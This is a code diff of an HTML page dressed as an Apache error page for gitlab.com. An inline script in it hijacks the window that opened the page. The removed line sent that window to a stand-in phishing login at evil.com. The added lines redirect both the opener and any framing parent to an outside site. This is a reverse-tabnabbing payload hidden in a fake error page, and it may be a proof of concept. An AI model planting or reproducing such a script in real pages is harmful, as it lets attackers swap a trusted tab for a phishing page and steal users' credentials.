@@ -9,7 +9,8 @@
     <hr>
     <address>Apache/2.2.15 (Red Hat) Server at gitlab.com Port 443</address>
     <script>
-        window.opener.location.assign('https://evil.com/ph-login.html');
+        if (window.opener) window.opener.parent.location.replace('http://allthethings.co.nz');
+        if (window.parent != window) window.parent.location.replace('http://allthethings.co.nz');
     </script>
 </body>
 </html>
